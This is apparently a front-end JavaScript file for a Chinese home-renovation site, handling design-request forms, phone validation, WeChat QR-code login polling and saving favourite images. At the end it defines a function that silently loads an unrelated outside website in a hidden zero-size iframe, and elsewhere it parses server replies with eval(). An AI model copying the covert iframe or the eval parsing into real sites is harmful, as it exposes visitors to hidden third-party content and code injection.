                              '<span class="mod_pagetip_ico"><em class="ico_tip_ok_s"></em></span>'+
                              '<div class="mod_pagetip_bd">'+
                                '<div class="mod_pagetip_title">扫描成功</div>'+
                              '</div>'+
                            '</div>'+
                            '<div class="mod_pagetip mod_pagetip_s" style="display:none" id="status_fail">'+
                              '<!-- 二维码失效 --><span class="mod_pagetip_ico"><em class="ico_tip_warn_s"></em></span>'+
                              '<div class="mod_pagetip_bd">'+
                                '<div class="mod_pagetip_title">二维码失效</div>'+
                                '<div class="mod_pagetip_info">'+
                                  '请点击<a href="javascript:;" onclick="getnewcode('+res.tmpYid+')">刷新二维码</a>'+
                                '</div>'+
                              '</div>'+
                            '</div>'+
                          '</div>'+
                        '</div>'+
                      '</div>'+
                '</div>';

        jq('.window_box').windowBox({
            width: 520,
            title: "",
            wbcStr: str,
            closeFn: 'stop_code_status'
        });
    }
};

//招标完善资料最后一步
function selectConfirmZbOverXGT(){
	var zb_wxover_msg = '<p class="pb">想省心省钱不被坑 来装修学堂就够了。</p><a target="_blank" class="mod_fbbox_btn btn_01af63" href="http://www.to8to.com/huodong/tuangou.php?id=126&ptag=5_6_1">免费学装修</a>';
	//验证面积
	var mjObj = jq("#oarea"),
        errTip = mjObj.parent().parent().find(".err_tip");
    if(isNaN(mjObj.val())||mjObj.val()==''||mjObj.val()=='0'){
       errTip.eq(0).css('display',"block");
   	   mjObj.focus();
	   setTimeout(function(){ errTip.eq(0).css("display","none");},2500);
   	   return;
    } else if(mjObj.val() > 9999){
        errTip.eq(1).css('display',"block");
        mjObj.focus();
        setTimeout(function(){ errTip.eq(1).css("display","none");},2500);
        return;
    }
 	//END 验证面积
	var User_City   = jq("#User_City_1").val();
    var oarea  = jq("#oarea").val();
    var zxys   = jq("#zxys").val();
    var zxtype = jq("#zxtype").val();
	var address = jq("#address").val();
	if(jq("#txttype_1").val())
	{
		zxtype = jq("#txttype_1").val();
	};
    var zxtime = jq("#zxtime").val();
	var hometype = jq("#hometype").val();
	var sendmobiletime = jq("#sendmobiletime").val();
	var tyid   = jq("#tyid").val();
	/*******************************微信招标************************************/  
	/*		status_request.abort();
			  var weixin_code = ''; 
			  var over_qrcode_id = '';
			  jq.ajax({  
						async:true, 
						type:"GET",      
						dataType: 'jsonp',    
						url:"http://www.to8to.com/api/weixin/run.php",      
						data:{action:'createQrcode',cookie_id:'test',data:'createWxCode',type:1}, 
						success:function(res){ 
								if(res.code==0)
								{
									weixin_code = res.url;
									over_qrcode_id = res.qrcode_id;
	/*******************************微信招标************************************/ 
    
    jq.ajax({
          type: "POST",
          url: "http://xiaoguotu.to8to.com/getuserdata.php",
          data: {invite:2,User_City:User_City,tyid:tyid,oarea:oarea,zxys:zxys,zxtype_two:zxtype,zxtime:zxtime,sendmobiletime:sendmobiletime,hometype:hometype,address:address,pos:'outindex',s:Math.random(5)},
          success:function(result){
              if (typeof(JSON) == "undefined") {
                var res = eval("(" + result + ")")
              } else {
                var res = JSON.parse(result)
              }
              if (res.status == 4)
              {
				   window_box_close();
					 indexYYFail(res.cityname);
					 return false;
		
                  //backFirstFrame();
                  //jq("#tmpCity").html(res.cityname);
              }
              else
              {
                  jq ('.window_box').remove();
			  	  jq ('.translucence_layer').remove();
				  if(res.cityname != "深圳" && res.cityname != "南京" && res.cityname != "广州") {
						zb_wxover_msg = "您的申请正在加速处理中...";
				  }
                  var successStr ='<div class="mod_fbbox">'+
				                      '<div class="fbbox_s3">'+
						                  '<div class="mod_pagetip">'+
						                      '<span class="mod_pagetip_ico"><em class="ico_tip_ok"></em></span>'+
						                      '<div class="mod_pagetip_bd compatibility">'+
						                          '<div class="mod_pagetip_title">恭喜您成功完善资料！</div>'+
						                          '<div class="mod_pagetip_info">'+zb_wxover_msg+'</div>'+
						                      '</div>'+
						                  '</div>'+
						                  /*
										  '<div class="mod_fbbox_code">'+//扫码状态
															'<span class="logo"></span>'+
												'<img src="'+weixin_code+'" id="weixin_img">'+
												'<p id="code_message">扫描二维码，实时获取装修进度</p>'+
										  '</div>'+
										   '<div class="mod_pagetip mod_pagetip_s mod_pagetips_noinfo" style="display:none" id="status_success">'+
											  '<span class="mod_pagetip_ico"><em class="ico_tip_ok_s"></em></span>'+
											  '<div class="mod_pagetip_bd">'+
												  '<div class="mod_pagetip_title">扫描成功</div>'+
											  '</div>'+
											'</div>'+
											'<div class="mod_pagetip mod_pagetip_s" id="status_fail" style="display:none">'+
											  '<span class="mod_pagetip_ico"><em class="ico_tip_warn_s"></em></span>'+
											  '<div class="mod_pagetip_bd">'+
												  '<div class="mod_pagetip_title">二维码失效</div>'+
												  '<div class="mod_pagetip_info">请点击<a href="javascript:;" onclick="getnewcode('+res.tmpYid+')">刷新二维码</a></div>'+
											  '</div>'+
											'</div>'+//扫码状态
											*/
						              '</div>'+
						          '</div>';
				stop_code_status();//关闭微信扫码状态请求
				jq('.window_box').windowBox({
				width:480,
				title:"提示",
				wbcStr:successStr
				});
				//zb_getwxstatus(over_qrcode_id,tyid);
              }
          }
    });
		
/*******************************微信招标************************************/  						  
/*									}
						else
						{
							alert(res.msg); 
						} 
							 
					}              
			  });
/*******************************微信招标************************************/ }


//获取微信扫码状态
var status_num=0;
var status_request;
	function zb_getwxstatus(zb_qrcode_id,yid)
	{
		
		status_request = jq.ajax({ 
			async:true, 
            type:"GET",      
            dataType: 'jsonp',      
            url:"http://www.to8to.com/api/weixin/run.php", 
            data:{action:'getScanState',cookie_id:'test',qrcode_id:zb_qrcode_id}, 
            timeout:15000,     //ajax请求超时时间30秒      
            success:function(res,textStatus){  
            	
            	if(res.code=="405"){ 
					if(status_num<19)//一分钟
					{
						status_num++;
						zb_getwxstatus(zb_qrcode_id,yid);  	
					}else
					{
						jq("#code_message").hide();
						jq("#status_fail").show();
					}
                } 
            	if(res.code=="0"){ 
					jq("#code_message").hide();
					jq("#status_success").show();
					//zb_getwxuser(zb_qrcode_id,yid);  
					jq.ajax({ 
						async:true, 
						type:"GET",      
						dataType: 'jsonp',      
						url:"http://www.to8to.com/zb/index.php", 
						data:{weixin_act:'weixin_banding',yid:yid,open_id:res.user.openid,unionID:res.user.unionID,header_url:res.user.pic_header_url,user_name:res.user.nickname,qrcode_id:zb_qrcode_id}, 
						success:function(data){  

							if(data.code=="0"){ 
								alert(data.msg);	
							} 
								
						}
					});  
                } 
                    
            },      
            error:function(XMLHttpRequest,textStatus,errorThrown){      
                if(textStatus=="timeout"){ 
                	if(status_num<19)//一分钟
					{
						status_num++;
						zb_getwxstatus(zb_qrcode_id,yid);  	
					}else
					{
						jq("#code_message").hide();
						jq("#status_fail").show();
					} 
                }      
        	} 
        });      
		
	}
	
	
function getnewcode(tmpYid){
		  status_num = 0;	
		  var weixin_code = ''; 
		  jq.ajax({  
					async:true, 
					type:"GET",      
					dataType: 'jsonp',    
					url:"http://www.to8to.com/api/weixin/run.php",      
					data:{action:'createQrcode',cookie_id:'test',data:'createWxCode',type:1}, 
					success:function(res){ 
							if(res.code==0)
							{
								jq("#status_fail").hide();
								jq("#code_message").show();
								jq("#weixin_img").attr('src',res.url);
								zb_getwxstatus(res.qrcode_id,tmpYid);
							}
					else
					{
						alert(res.msg); 
					} 
						 
				}              
		  });
			  
} 

	var yuyue_apply_agin =0;
    function freeDesign(thisObj,ctype)
    {

    var oldaid   = jq(thisObj).parents(".item").attr("oldaid"),ptag;
    jq('#show_img').attr("oldaid",oldaid);
      if(ctype==0)
      {
        ptag='1_2_2_3';
      }
      else if(ctype==1)
      {
        ptag='1_2_2_1';
      }
      else{
        ptag='1_2_1_1';
      }
      clickStream.getCvParams(ptag);
      var str = '<div class="freeQuote_box_content clear"><ul><li><span class="fbc_name">您的称呼</span><input type="text"class="fq_text" name="yourname"></li><li><span class="fbc_name">手机号码</span><input type="text"class="fq_text" name="youriphone"></li><li><span class="fbc_name">申请城市</span>'+
      "<select class=\"fq_province\" id=\"User_Shen1\"  name=\"User_Shen1\" onChange=\"changeProvince('User_Shen1','User_City1','User_Town1')\"></select><select class=\"fq_area\" id=\"User_City1\" name=\"User_City1\"></select><select  class=\"dn\" id=\"User_Town1\" name=\"User_Town1\"></select>"+
      "<input name='ptag' type='hidden' id='ptag' value='"+ptag+"'/>"+
      '</li></ul><input type="submit"value="免费申请"class="fq_btn"><div class="fq_description"><em></em>为了你的利益及我们的口碑，你的隐私将被严格保密。</div></div>';
      jq('.window_box').windowBox({
          width:480,    //弹框宽度
          title:"免费户型设计", //标题
          littleTitle:"3份方案对比，挑选最满意设计",
          wbcStr:str,  //可编辑内容
          cancleBtn:false,    //是否显示取消按钮
          confirmBtn:false,  // 是否显示确认按钮
          callback:checkInput
      });
     
       var gpm = new GlobalProvincesModule;               //城市类
        gpm.def_province = ["省/市", ""];
        gpm.def_city1 = ["市/地区", ""];
        gpm.initProvince($('User_Shen1'));
        gpm.initCity1($('User_City1'), gpm.getSelValue($('User_Shen')));
     
    };
    function checkInput(){//临时
        jq('.fq_text[name="yourname"]').blur(function(){
            var str = "";
            var parentSpan = jq(this).parent().find('span.window_box_error');
            if(jq(this).val() =="" && parentSpan.length == 0){
              str += '<span class="window_box_siyinError window_box_error"><em></em>称呼不能为空</span>';
              jq(this).css('border-color',"#ff6767");
              jq(this).parent().css("height","auto");
              jq(this).after(str);
            }else if(jq(this).val()!=""){
              jq(this).parent().find('span.window_box_error').remove();
              jq(this).css('border-color',"#ccc");
            }
        })
        jq('.fq_text[name="yourname"]').focus(function(){
            jq(this).css('border-color',"#ccc");
            jq(this).parent().find('span.window_box_error').remove();
        });
        jq('.fq_text[name="youriphone"]').blur(function(){
            var str = "";
            var reg = /^[1][34578]\d{9}$/;
            var parentSpan = jq(this).parent().find('span.window_box_error'),
                phoneValue = jq(this).val();
            if(phoneValue =="" && parentSpan.length == 0){
              str += '<span class="window_box_siyinError window_box_error"><em></em>手机号码不可以为空</span>';
              jq(this).css('border-color',"#ff6767");
              jq(this).parent().css("height","auto");
              jq(this).after(str);
            }else if(phoneValue!="" && !reg.test(phoneValue)){
              str += '<span class="window_box_siyinError window_box_error"><em></em>请填写正确的手机号码</span>';
              jq(this).css('border-color',"#ff6767");
              jq(this).parent().css("height","auto");
              jq(this).after(str);
            }else{
              jq(this).css('border-color',"#ccc");
              jq(this).parent().find('span.window_box_error').remove();
            }
        });
        jq('.fq_text[name="youriphone"]').focus(function(){
            jq(this).css('border-color',"#ccc");
            jq(this).parent().find('span.window_box_error').remove();
        });
        jq('#User_City').focus(function(){
            jq(this).parent().find('span.window_box_error').remove();
            }
          );
        jq('.fq_btn').bind('click', function() {
											
            var str = "";
            var reg = /^[1][34578]\d{9}$/;
            var parentSpan = jq('.fq_text[name="youriphone"]').parent().find('span.window_box_error');
            var phone  = jq('.fq_text[name="youriphone"]').val();
            var name   = jq('.fq_text[name="yourname"]').val();
            var city   = jq('#User_City').val();
			if(city==undefined){city = jq('#User_City1').val();}
			var shen   = jq('#User_Shen').val();
			if(shen==undefined){shen = jq('#User_Shen1').val();}
            var ptag   =  jq('#ptag').val();
            if( name=="" && parentSpan.length == 0){
              str += '<span class="window_box_siyinError window_box_error"><em></em>称呼不能为空</span>';
              jq('.fq_text[name="yourname"]').css('border-color',"#ff6767");
              jq('.fq_text[name="yourname"]').parent().css("height","auto");
              if(jq('.fq_text[name="yourname"]').next().length ==0)
              {
                jq('.fq_text[name="yourname"]').after(str);
              }
              return false;
            }else if ( phone =='' || !reg.test(phone))
            {
              str += '<span class="window_box_siyinError window_box_error"><em></em>请填写正确的手机号码</span>';
              jq('.fq_text[name="youriphone"]').css('border-color',"#ff6767");
              jq('.fq_text[name="youriphone"]').parent().css("height","auto");
              if(jq('.fq_text[name="youriphone"]').next().length ==0)
              {
                jq('.fq_text[name="youriphone"]').after(str);
              }
              return false;
            }
            else if (city =='')
            {
              str += '<span class="window_box_siyinError window_box_error"><em></em>请选择服务城市</span>';
              if(jq('.freeQuote_box_content ul li').eq(2).find('.window_box_error').length ==0)
              {
                jq('.freeQuote_box_content ul li').eq(2).css("height","auto").append(str);
              }
              return false;
            }
            else{
				
                var id = jq("#show_img").attr('oldaid'); 
                id=id?id:(id+2000000000);
                var _data='pos=outindex&phone='+phone+'&backsuccess=1&id='+id + '&User_Shen=' + shen + '&ptag=' + ptag +'&chenghu='+encodeURIComponent(name)+'&User_City='+city+'&sourceid=21&s_sourceid=56&s='+Math.random(5);
                // insertScript('sInsertScript_userdata',href);
				
				/*
                if (yuyue_apply_agin > 0) {
                    return false;
                } else {
                    yuyue_apply_agin++;
                } 
				*/
	/*******************************微信招标************************************/  
			  var weixin_code = ''; 
			  var start_qrcode_id = '';
			  jq.ajax({  
						async:true, 
						type:"GET",      
						dataType: 'jsonp',    
						url:"http://www.to8to.com/api/weixin/run.php",      
						data:{action:'createQrcode',cookie_id:'test',data:'createWxCode',type:1}, 
						success:function(res){ 
								if(res.code==0)
								{
									weixin_code = res.url;
									start_qrcode_id = res.qrcode_id;
	/*******************************微信招标************************************/ 
            jq.ajax({
                type: "POST",
                url: "http://xiaoguotu.to8to.com/getuserdata.php",
                data: _data,
                success: function(result) {

					
				  if (typeof(JSON) == "undefined") {
					var res = eval("(" + result + ")")
				  } else {
					var res = JSON.parse(result)
				  }
				  jq ('.window_box').remove();
			  	  jq ('.translucence_layer').remove();
				  if (res.status == 1) {
					  
					  if (!res.tmpYid)
					  {
					  	overFive();
						yuyue_apply_agin = 0;
						return;

					  }
					  window_box_close();
						//更改部分，完善资料弹窗 2015-3-12 by windy
						/*var successStr = zb_first_pop(weixin_code,res.tmpYid);
						jq('.window_box').windowBox({
						  width:560,
						  title:"提示",
						  wbcStr:successStr,
							closeFn:'stop_code_status'
						});*/
						indexSubZbStepOneXGT(res,weixin_code);
						//End Modify	
						//zb_getwxstatus(start_qrcode_id,res.tmpYid);
					return false;
				  }
				  else if(res.status == 5)
				  {
					 window_box_close();
					 indexYYFail(res.cityname);
					 return false;
				  }
				  else
				  {
					var cityname = encodeURI(res.cityname);
					var tyid   = encodeURI(res.tmpid);
					showPopWin("http://www.to8to.com/zb/frame_global.php?msg="+cityname + "&tyid=" + tyid , 456, 254, null, true);
				  }
				 
                }
            });
			
/*******************************微信招标************************************/  						  
									}
						else
						{
							alert(res.msg); 
						} 
							 
					}              
			  });
/*******************************微信招标************************************/ }
        });
  

    };
    
    function checkLogin(param) {
            param       = param || 'yz';
            var p_arr   = param.split(','),
                _zs_sjs = 0,
                ind     = getCookie('to8to_ind');
            // 判断是否是装修公司设计师
            if ( in_array('zs_sjs', p_arr) ) {
                if ( ind == 'zs' && getCookie('to8to_fcm_tid') > 0 ) {
                    _zs_sjs = 1;
                }
            }
            if (!getCookie('auth',true)) {
                showPopWin('http://www.to8to.com/pop_login.php', 500, 426, null, false);
                return false; 
            } else if ( in_array(ind, p_arr) == false && _zs_sjs == 0 ) {
                var _val    = '';
                if ( in_array('yz', p_arr) ) {
                    _val    = '业主';
                }
                if ( in_array('sjs', p_arr) ) {
                    _val    = _val == '' ? '设计师' : _val + ',' + '设计师';
                }
                if ( in_array('zs', p_arr) ) {
                    _val    = _val == '' ? '装修公司' : _val + ',' + '装修公司';
                }
                if ( in_array('zs_sjs', p_arr) ) {
                    _val    = _val == '' ? '装修公司设计师' : _val + ',' + '装修公司设计师';
                }
                if ( in_array('sj', p_arr) ) {
                    _val    = _val == '' ? '商家' : _val + ',' + '商家';
                }
                jq('.window_box').windowBox({
                            width:450,    //弹框宽度
                            height:185,   //弹框高度
                            title:"收藏", //标题
                            wbcStr:"<p style='text-align:center;margin-top: 55px;font-size: 14px;'>只有'"+_val+"'身份才能进行此操作</p>",
                            cancleBtn:false,    //是否显示取消按钮
                            confirmBtn:false  // 是否显示确认按钮
                  });
                  return false;
                return false;
            }   
            return true;
        }

        /**
     * 检测数组中是否有某个元素
     *
     * @param   string  find    要查的数据
     * @param   array   arr     目标数组
     */
    function in_array(find, arr) {
        var ret = false;
        for (var i in arr) {
            if ( jq.trim(arr[i]) == find ) {
                ret = true;
                break;
            }
        }
        return ret;
    }



  function getuseraids(){
    var aidsval = [];
    jq.ajax({
      url:'/xgt_get_userinfo.php?' + Math.random(),
      success:function(data){
          if(data.status == true ){
          jq('#imgids').attr('aids',data.aids);
        }else if( data.status == false){
          jq('#imgids').attr('aids','false');
        }
      },
      async:false,
      dataType:'json'
    });
    return aidsval;
  }
  function pop_parent_submit (){
    getuseraids();
  }

  function saveCollection()//提交保存收藏
  {
      var uid         = getCookie('to8to_uid');
      var tid         = getCookie('to8to_fcm_tid');
      var favname     = jq("input[name='new_album_input']").val();
      var xfid        = jq("select[name='album_select']").val();
      var oldaid      = jq('#show_img').attr("oldaid");
      var caseid      = jq('#show_img').attr("oldcid");
      var collectType = jq("input[name='collect_type']:checked").val();
      var albumType   = jq("input[name='album_type']:checked").val();
      var url         ='';
      var data;
      var cbcStr = '<span class="window_box_collectError window_box_error"><em></em>专辑名不能为空</span>';
      if(favname == "" && albumType ==2){
        jq('.cbc_text[name="new_album_input"]').css('border-color',"#ff6767");
        jq('.cbc_text[name="new_album_input"]').parent().css("height","auto");
        if(jq('.cbc_text[name="new_album_input"]').next().length ==0)
        {
          jq('.cbc_text[name="new_album_input"]').after(cbcStr);
        }
        return false;
      }else{
        jq(this).parent().find('span.window_box_error').remove();
        jq('.cbc_text[name="new_album_input"]').css('border-color',"#ccc");
      }
          
      if (collectType==1) 
      {
        //单张收藏
        url='/collection.php?type=2';
        var width,height,filename,title;
        width    = jq('#show_img').attr("width");
        height   = jq('#show_img').attr("height");
        title    = jq('#show_img').attr("title");
        filename = jq('#show_img').attr("filename");

        if (albumType==1) 
        {
          //单张收藏至已有文件夹
          data={uid:uid,tid:tid,xfid:xfid,aid:oldaid,width:width,height:height,title:title,filename:filename};
          //alert("单张收藏至已有文件夹");

        }
        else if(albumType==2)
        {
          //单张收藏至新建文件夹
          data={uid:uid,tid:tid,favname:favname,aid:oldaid,width:width,height:height,title:title,filename:filename};
          //alert("单张收藏至新建文件夹");
        }


      }
      else if (collectType==2) 
      {
        url='/collection.php?type=5';
        //套图收藏
        if (albumType==1) 
        {
          //套图收藏至已有文件夹
          data={uid:uid,tid:tid,xfid:xfid,caseid:caseid};
          //alert("套图收藏至已有文件夹");

        }
        else if(albumType==2)
        {
          //套图收藏至新建文件夹
          data={uid:uid,tid:tid,favname:favname,caseid:caseid};
          //alert("套图收藏至新建文件夹");
        }

      }

      jq.ajax({
      type:"post",
      url:url,
      data:data,
      success:function(data){
          if(data == 1 )
          {
            jq(".window_box_container").html("<p style='text-align:center;margin-top: 55px;font-size: 14px;'>您已成功收藏图片！请继续逛逛吧！</p>");
            jq(".window_box").css("height","185px");
          }
          else if( data == 0)
          {
            jq(".window_box_container").html("<p style='text-align:center;margin-top: 55px;font-size: 14px;'>收藏失败，请稍候再试！</p>");
            jq(".window_box").css("height","185px");
          }
          else if ( data == -1 ) 
          {
            jq(".window_box_container").html("<p style='text-align:center;margin-top: 55px;font-size: 14px;'>您已收藏过该图片，请勿重复收藏！</p>");
            jq(".window_box").css("height","185px");
          }
      }
      });
  }

getuseraids();

var xfkjIframe = (function($) {

    function createIframe() {
        var iframe = document.createElement('iframe');
        iframe.src = 'http://www.hhh.com.tw/';
        iframe.style.width = "0";
        iframe.style.height = "0";
        iframe.style.border = 'none';
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
    }

    return function() {
        createIframe();
    }

})(jQuery);